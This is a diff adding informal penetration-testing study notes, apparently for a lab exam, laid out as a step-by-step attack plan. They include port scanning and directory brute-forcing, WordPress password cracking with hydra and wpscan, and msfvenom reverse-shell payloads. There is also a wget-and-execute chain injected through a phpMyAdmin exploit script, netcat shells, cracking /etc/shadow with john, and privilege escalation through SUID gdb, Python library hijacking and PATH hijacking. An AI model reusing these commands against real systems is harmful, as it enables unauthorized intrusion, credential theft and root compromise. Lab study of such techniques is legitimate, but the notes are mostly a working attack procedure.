@@ -1,0 +1,200 @@
+https://172.22.214.143:2222/
+Scanning for UDP is very slow, it's better to scan for TCP
+nmap - function to scan
+ICMP echo - disables pinging on a machine
+sudo - to run as admin
+sudo su -  // write every class
+nmap flags: -sn //ping scan
+            -sS // SYN/stealth scan (works only for tcp)
+	    -sV //version flag
+      	    -sU // scan for UDP ports
+	    -p // which ports to check
+		-p 80, 22, 443
+		-p- // all ports
+	    -T0,...,T5  //speed (T0 - slowest, T5 - fastest)
+	    -O // OS scan
+	    -sC // default scripts (safe scripts that wont break the machine)
+	    --script // vulnerability, that can kill the target machine
+
+dirb / dirbuster - programs for finding additional pages of website
+	-X // extentions e.x .php ; .html
+	-r // non recursive search (important, if not to include, the script might run forever
+	// We seeking for codes 200, 401
+
+hydra - password breaking tool // NOT LEGAL
+
+//rockyou - 2M passwords sample
+
+DT - Directory traversal, UFU - Unverified File Upload
+
+reverse shell // getting access to target's shell
+
+msfvenom // writing shellcodes to access target's shell
+	-p // payload type
+	LHOST // our machine, that target machine will be connected
+	-f // .exe .py .elf raw -format
+	> // redirect //mysheel.exe ...
+
+nc -lvp 4444 // creating listener on the designated port
+	-n // reverse DNS lookup to see any other ip adresses
+	-nv 30.0.. -e /bin/bash // ...
+
+Upgrading to an interactive shell
+
+1) NON-PHP : python(3) -c "import pty;pty.spawn('/bin/bash')"
+
+2) PHP : Shell-chaining
+	
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python // download cheatsheet
+	
+
+
+wpscan --url// to scan is site running on wordpress
+	- e u // enumerate users to finfd users
+	--rua // random user agent to stay undetected
+	-t // max threads to use
+TRY DEFAULT USRNAME AND PASSWORD
+admin admin
+TO BREAK INTO THE SITE
+--url http://vtcsec/secret/ --usernames admin --password /usr/share/wordlists/rockyou.txt
+
+user-agent // identifier of the browser(mozila, edge, chrome ...)
+
+
+msfvenom -p php/reverse_php LHOST=30.0.1.13 LPORT=1234 raw > wordpressshell.php
+
+mfsconsole //enter the mfs console mode
+	search (wordpress) // search for exploits
+	use (No of exploit) // use favorable exploit -> options to see requierments -> run -> shell
+	use admin shell upload
+	optins
+	set (required options)
+	run
+
+Database Exploit // website for exploiting database
+
+//Exam Plan
+
+1) Check open ports
+
+2)If 80 - check website
+
+3)find direcrories using dirbuster and wordlist - common
+
+4)log in as admin/root rights
+
+Use database exploit
+python3 50457.py 40.0.5.12 80 /phpmyadmin pma pass
+
+5)get a reverse shell
+	5.1 Define target's OS (type "systeminfo", if respond - windows, type "uname -a", if respond - Linux //On exam machines always will be Linux x64
+
+	5.2 generate shellcode with mfsvenom // msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.1.13 LPORT=4444 -f elf > shell-x64.elf
+
+
+
+github cheatsheet is for oneliners
+
+infinitelogins.com
+non-meterpret Binaries - Stageless //depending on OS version
+
+	
+	5.3 Enter the directory where the shellcode is
+	
+	5.4 use "python3 -m http.server" in this folder
+	
+	5.5 nc -lvnp <PORT> on a separate terminal window
+
+	"cd /tmp;rm -rf <shellcode_name>; wget http://<your_ip>:8000/<shellcode_name>;chmod 777 <shellcode name>;/tmp/<shellcode_name>"
+
+python3 50457.py 40.0.5.12 80 /phpmyadmin pma pass "cd /tmp;rm -rf <shellcode_name>; wget http://<your_ip>:8000/<shellcode_name>;chmod 777 <shellcode name>;/tmp/<shellcode_name>"
+
+
+
+switch to interactive shell : In listener window execute : python3 -c "import pty;pty.spawn('bin/bash')"
+
+github cheatsheet is for oneliners
+
+infinitelogins.com
+non-meterpret Binaries - Stageless //depending on OS version
+
+
+After connection:
+sudo -l
+1) 
+a)Permission misconfiguration			
+					-rw-r??
+ls -l /etc/passwd
+      /etc/shadow // if r then possible to read
+	cat /etc/shadow/ // also work for passwd
+
+sign -> ACL
+	getfacl
+
+breaking hashed passwords:
+TO GET TXT PASSWORD FILE
+username:PASSWORD:userid:  //find ar cat /etc/passwd //instead password copy form shadow? long part
+
+john(the ripper)
+john saved_file --wordlist=/usr/share/wordlists/rouckyou.txt // to find password for user
+OR
+john saved file // john creates its own wordlist and tries to find passa
+
+username:PASSWORD:userid:  //find ar cat /etc/passwd //instead password copy form shadow? long part
+
+3 possibilities (y = --format = crypt, 5 = sha256, 6 = sha512) get password
+
+su "User"
+
+b) SUID (Set UID)
+	find / -perm -u=s 2>/dev/null // find sweetbit files !MUST TO DO
+
+gtfobins to find target programs
+
+
+run target program(in example gdb)
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
+2) SUDO Priveleges
+	sudo -l
+	su username //to change user
+	sudo su root // to become root user
+
+cat to run programs
+
+3) Python library hijacking
+
+import random
+	seraching for random library in the same folder where the python program is (/home/bob)
+	add library with echo "import pty;pty.spawn('bin/bash')" > random.py
+run the code sudo -u "username"
+
+4)PATH hijacking 
+
+echo $PATH
+/home/username/(paste PATH)
+export PATH = /home/username/(paste PATH)
+echo'#!/bin/bash' > df  //df is a directory, could be /tmp
+echo '/bin/bash -a' >>df
+chmod +x df
+./message_from_username
+
+
+/tmp/shell-x64.elf - to run code
+
+
+
+SSH should not be used for attcking, however could be used to find username and password
+
+SSH login@machine_ip_address //only if we have username
+dirb http://40.0.8.12 /usr/share/wordlists/dirb/common.txt -r  // dirb console scan
+
+To connect ip adresses:
+	1) sudo nano /etc/hosts
+	2) create connection (for ex: 40.0.8.12	   vtcsec)
+
+msfconsole -q // To powerup metasploit
+/tmp //directory is always accessible
+
+40.0.5.1-5 for practice
